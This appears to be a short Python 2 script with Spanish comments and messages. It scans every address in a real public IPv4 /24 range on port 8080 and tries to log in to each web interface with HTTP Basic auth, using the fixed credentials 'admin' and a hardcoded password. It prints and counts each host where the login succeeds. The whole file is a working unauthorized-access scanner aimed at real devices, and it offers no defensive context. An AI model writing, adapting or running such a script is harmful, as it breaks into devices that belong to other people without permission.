import requests
from requests.auth import HTTPBasicAuth
import json
ip="186.146.166."
count=0
#file=open("rom-0.txt", "w")
for i in range(0,256):
    try:
        #print "En proceso "+ip+str(i)
        r1=requests.get('http://'+ip+str(i)+':8080/', timeout=0.3)
        a=r1.status_code
        code=str(a)
        if code!="200":
            r=requests.get('http://'+ip+str(i)+':8080/', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.3)
            b=r.status_code
            code1=str(b)
            if code1=='200':
                count=count+1
                print ip+str(i)+".................loged ok"
            
        #file.write(ip+str(i))
    except requests.exceptions.ConnectTimeout:
        pass
    except requests.exceptions.ReadTimeout:
        pass
    except requests.exceptions.ConnectionError:
        pass
    except KeyError:
        pass
print "Se ha logrado logear en "+str(count)+" hosts"
    
    
	
